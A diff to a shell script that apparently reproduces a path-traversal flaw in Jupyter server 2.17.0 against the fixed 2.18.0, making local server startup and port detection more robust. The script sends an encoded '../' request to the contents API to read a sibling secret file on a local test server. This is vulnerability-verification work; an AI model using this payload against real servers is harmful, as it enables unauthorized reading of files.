@@ -1,0 +1,92 @@
+--- repro/reproduction_steps.sh
++++ repro/reproduction_steps.sh
+@@ -11,6 +11,7 @@
+ VULNERABLE_VERSION="2.17.0"
+ FIXED_VERSION="2.18.0"
+ PORT=28888
++PORT_MAX=28898
+ TESTDIR="$ROOT/tmp_test_dirs"
+ VENV="$ROOT/.jupyter_repro_venv"
+ 
+@@ -18,9 +19,9 @@
+ cleanup() {
+     set +e
+     # Kill any running jupyter server on our port range
+-    pkill -9 -f "jupyter.server.*port=28888" 2>/dev/null || true
+-    pkill -9 -f "jupyter.server.*port=28889" 2>/dev/null || true
+-    pkill -9 -f "jupyter.server.*port=28890" 2>/dev/null || true
++    for port in $(seq "$PORT" "$PORT_MAX"); do
++        pkill -9 -f "jupyter.*--port=$port" 2>/dev/null || true
++    done
+     sleep 1
+     rm -rf "$TESTDIR"
+ }
+@@ -60,6 +61,8 @@
+     "$VENV/bin/jupyter" server \
+         --notebook-dir="$TESTDIR/data" \
+         --port=$PORT \
++        --port-retries=$((PORT_MAX - PORT)) \
++        --ip=127.0.0.1 \
+         --allow-root \
+         --no-browser \
+         --ServerApp.token='' \
+@@ -67,23 +70,41 @@
+         > "$logfile" 2>&1 &
+ 
+     local jpid=$!
+-    sleep 4
+ 
+-    # Find actual port (server may increment if port is in use)
+-    ACTUAL_PORT=$PORT
+-    if ! curl -s "http://localhost:$ACTUAL_PORT/api/contents/" > /dev/null 2>&1; then
+-        ACTUAL_PORT=$((PORT + 1))
+-        if ! curl -s "http://localhost:$ACTUAL_PORT/api/contents/" > /dev/null 2>&1; then
+-            ACTUAL_PORT=$((PORT + 2))
++    # Wait for the server to bind. Codespaces can be slower than the local
++    # sandbox during first-start package imports, and Jupyter may increment the
++    # port if a previous process is still releasing it.
++    ACTUAL_PORT=""
++    for _ in $(seq 1 60); do
++        if ! kill -0 "$jpid" 2>/dev/null; then
++            echo "Jupyter server exited before becoming ready" >&2
++            tail -80 "$logfile" >&2 || true
++            return 000
+         fi
++        for candidate_port in $(seq "$PORT" "$PORT_MAX"); do
++            if curl -sf "http://127.0.0.1:$candidate_port/api/contents/" > /dev/null 2>&1; then
++                ACTUAL_PORT="$candidate_port"
++                break 2
++            fi
++        done
++        sleep 1
++    done
++
++    if [ -z "$ACTUAL_PORT" ]; then
++        echo "Jupyter server did not become reachable" >&2
++        tail -80 "$logfile" >&2 || true
++        kill "$jpid" 2>/dev/null || true
++        wait "$jpid" 2>/dev/null || true
++        return 000
+     fi
+ 
+     echo "Server running on port $ACTUAL_PORT (PID $jpid)" >&2
+ 
+     # Request the sibling file via path traversal
+     local http_code
+-    http_code=$(curl -s -o "$bodyfile" -w "%{http_code}" \
+-        "http://localhost:$ACTUAL_PORT/api/contents/%2e%2e%2fdatasecret/secret.txt?content=1")
++    http_code=$(curl -sS -o "$bodyfile" -w "%{http_code}" \
++        "http://127.0.0.1:$ACTUAL_PORT/api/contents/%2e%2e%2fdatasecret/secret.txt?content=1" \
++        2>>"$logfile" || printf '000')
+ 
+     echo "HTTP_CODE:$http_code" >&2
+     cat "$bodyfile" >&2
+@@ -94,7 +115,7 @@
+ {
+   "version": "$version",
+   "label": "$label",
+-  "request_url": "http://localhost:$ACTUAL_PORT/api/contents/%2e%2e%2fdatasecret/secret.txt?content=1",
++  "request_url": "http://127.0.0.1:$ACTUAL_PORT/api/contents/%2e%2e%2fdatasecret/secret.txt?content=1",
+   "http_status": $http_code,
+   "response_body_file": "$bodyfile",
+   "server_log": "$logfile"
